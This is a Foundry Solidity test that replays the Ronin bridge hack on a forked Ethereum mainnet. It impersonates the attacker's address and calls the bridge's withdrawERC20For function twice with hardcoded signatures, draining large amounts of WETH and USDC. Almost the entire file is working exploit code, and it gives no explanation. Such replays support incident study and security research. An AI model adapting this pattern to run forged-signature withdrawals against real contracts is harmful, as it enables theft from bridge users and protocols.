// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./interface.sol";

interface IRoninBridge {
    function withdrawERC20For(uint256 _withdrawalId, address _user, address _token, uint256 _amount, bytes memory _signatures) external;
}

contract ContractTest is DSTest {
  address attacker = 0x098B716B8Aaf21512996dC57EB0615e2383E2f96;
  address roninBridge = 0x1A2a1c938CE3eC39b6D47113c7955bAa9DD454F2;
  address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
  address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

  function setUp() public {
    cheats.createSelectFork("mainnet", 14442834); //fork mainnet at 14442834
  }

  function testExploit() public {
    cheats.startPrank(attacker);

    IRoninBridge(roninBridge).withdrawERC20For({ // 0x993e1c42
      _withdrawalId: 2000000,
      _user: attacker, 
      _token: WETH, 
      _amount: 173600000000000000000000, 
      _signatures: hex"01175db2b62ed80a0973b4ea3581b22629026e3c6767125f14a98dc30194a533744ba284b5855cfbc34c1416e7106bd1d4ce84f13ce816370645aad66c0fcae4771b010984ea09911beeadcd3dab46621bc81071ba91ce24d5b7873bc6a34e34c6aafa563916059051649b3c1930425aa3a79a293cacf24a21bda3b2a46a1e3d39a6551c01f962ee0e333c2f7261b3077bb7b7544001d555df4bc2e6a5cae2b2dac3d1fe3875cd1d12fadbeb4c01f01e196aa36e395a94de074652971c646b4b3b7149b3121b0178bd67c4fa659087c5f7696d912dee9db37802a3393bf4bd799e22eb201e78d90dc3f57e99d8916cd0282face42324f3afa0d96b0a09c4f914f15cac9c11037b1b0102b7a3a587c5be368f324893ed06df7bdcd3817b1880bd6dada86df15bd50d275fc694a8914d1818a2d432f980a97892f303d5a893a3eec176f46957958ecb991c"
    });

    IRoninBridge(roninBridge).withdrawERC20For({ // 0x993e1c42
      _withdrawalId: 2000001,
      _user: attacker, 
      _token: USDC,
      _amount: 25500000000000, 
      _signatures: hex"016734b276131c27fa94464db17b44ca517b0a9134b15ee4b776596725741cc7836beea1681dda98a83406515981e1d315d5eba13a0173a5a9688f9f920d7a3f7a1c01155c24a2d7a2ffb02530cf58da40c528301dfc22b21b16267dbf4eba2cd3d087276142bddd1d82404b2e75bd12993606a0c7c7626aa74c4d90bd7e4558fbe4261c01067c5aaba1b8e5bb686cda9efdae909aff86dc83f5be79f13af3ee677fb1791175e0b03401bdf7aa6e604eb995c7670384e6fadef3d687a00fd6d33cd47a0dde1c01dad673b6630394d15f8cca8975351d8272390a6c8bb1cb07cc2b04e8d7ea7a867e56a99e9d0c17a8e0629cebda86ee5a5f8b42610494ad0ed0245ffe9b5287631c012f1fb5b4c2b3718ea69197a5239316fbb9b805be3cdf8420324765ab53144b006b3148921458e629ea254df2c383175ca250e6442b8904a0f50ffdf465f6aa6f1b"
    });

    // gasless transaction: 
    // https://medium.com/coinmonks/how-to-implement-gas-less-transactions-on-ethereum-9f9273d2f059  }
}
}